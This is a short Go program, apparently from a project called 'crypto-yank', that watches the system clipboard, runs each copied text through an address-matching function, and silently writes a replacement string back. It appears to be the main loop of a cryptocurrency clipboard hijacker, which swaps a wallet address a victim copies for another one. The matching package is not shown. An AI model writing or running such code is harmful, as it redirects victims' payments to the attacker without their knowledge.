package main

import (
	"context"
	"crypto-yank/internal/address"
	"flag"
	"log"

	"golang.design/x/clipboard"
)

func main() {
	err := clipboard.Init()
	verboseFlag := flag.Bool("verbose", false, "verbose mode")
	flag.Parse()

	if err != nil {
		log.Fatalf("unable to init clipboard, %s", err.Error())
	}
	ch := clipboard.Watch(context.Background(), clipboard.FmtText)
	for data := range ch {
		clipboardData := string(data)
		if *verboseFlag {
			log.Printf("current clipboard: %s", clipboardData)
		}
		newClipboardString, err := address.FindClipBoardMatch(clipboardData, *verboseFlag)
		if err == nil {
			clipboard.Write(clipboard.FmtText, []byte(newClipboardString))
			if *verboseFlag {
				log.Printf("wrote new string to clipboard: %s", newClipboardString)
			}
		}
	}
}
